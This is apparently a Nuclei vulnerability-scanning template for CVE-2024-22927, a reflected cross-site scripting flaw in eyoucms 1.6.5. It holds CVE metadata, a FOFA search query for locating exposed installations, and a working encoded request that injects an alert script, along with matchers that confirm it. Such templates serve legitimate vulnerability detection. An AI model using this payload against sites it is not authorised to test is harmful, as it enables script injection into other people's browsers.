id: CVE-2024-22927

info:
  name: eyoucms v.1.6.5 - Cross-Site Scripting
  author: ritikchaddha
  severity: medium
  description: |
    Cross Site Scripting (XSS) vulnerability in the func parameter in eyoucms v.1.6.5 allows a remote attacker to run arbitrary code via crafted URL.
  impact: |
    Allows attackers to execute malicious scripts on the victim's browser.
  remediation: |
    Upgrade eyoucms to version 1.6.6 or later to fix the XSS vulnerability.
  reference:
    - https://github.com/weng-xianhu/eyoucms/issues/57
    - https://nvd.nist.gov/vuln/detail/CVE-2024-22927
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2024-22927
    cwe-id: CWE-79
    epss-score: 0.03185
    epss-percentile: 0.8664
    cpe: cpe:2.3:a:eyoucms:eyoucms:1.6.5:*:*:*:*:*:*:*
  metadata:
    max-request: 1
    vendor: eyoucms
    product: eyoucms
    fofa-query: "title=\"eyoucms\""
  tags: cve2024,cve,eyoucms,cms,xss,vuln

http:
  - method: POST
    path:
      - "{{BaseURL}}/login.php?a=get_upload_list&c=Uploadimgnew&info=eyJudW0iOiIxXCI%2BPFNjUmlQdCA%2BYWxlcnQoZG9jdW1lbnQuZG9tYWluKTwvU2NSaVB0PiIsInNpemUiOiIyMDk3MTUyIiwiaW5wdXQiOiIiLCJmdW5jIjoiaGVhZF9waWNfY2FsbF9iYWNrIiwicGF0aCI6ImFsbGltZyIsImlzX3dhdGVyIjoiMSIsImFsZyI6IkhTMjU2In0&lang=cn&m=admin&unneed_syn="

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'name="num" value="1"><ScRiPt >alert(document.domain)</ScRiPt>'
          - 'id="eytime"'
        condition: and

      - type: word
        part: header
        words:
          - "text/html"

      - type: status
        status:
          - 200
# digest: 4a0a0047304502204b33005f5b351d347bbf67c77e52e4277ff09432f253ab524425b2b12a955843022100e7f91dc2a382c17ae382f1c1a356c735b2d0b95a4c9a8f4e2d496ad96af5e09c:922c64590222798bb761d5b6d8e72950